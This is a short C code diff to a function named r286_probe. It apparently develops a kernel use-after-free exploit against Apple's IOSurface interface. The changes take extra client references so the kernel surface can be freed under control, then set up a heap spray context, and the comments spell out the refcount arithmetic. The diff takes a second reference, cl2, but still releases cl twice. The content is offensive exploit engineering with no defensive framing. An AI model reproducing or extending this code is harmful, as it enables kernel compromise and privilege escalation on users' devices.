@@ -1852,14 +1852,17 @@ static void r286_probe(void) {
         IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1,
             NULL, 0, inp17, 24, NULL, NULL, NULL, NULL);
 
-        /* Get client for controlled free */
+        /* Get TWO client refs for controlled free.
+         * Refcount: Create(+1) + 2*Lookup(+2) = 3
+         * Then: CFRelease(-1) = 2, need 2 ClientReleases to free */
         IOSurfaceClientRef cl = clLookup(sid);
+        IOSurfaceClientRef cl2 = clLookup(sid);
         CFRelease(s);
 
         rlog("  iter %d: id=%u ", iter, sid);
         fflush(stdout);
 
-        /* FREE the kernel surface */
+        /* FREE the kernel surface: 2 releases for 2 lookup refs */
         clRelease(cl);
         clRelease(cl);
 
@@ -1951,6 +1954,7 @@ static void r286_probe(void) {
         CFRelease(p);
         uint32_t sid = IOSurfaceGetID(s);
         IOSurfaceClientRef cl = clLookup(sid);
+        IOSurfaceClientRef cl2 = clLookup(sid);
         CFRelease(s);
 
         struct r286_spray_ctx sctx = {0};
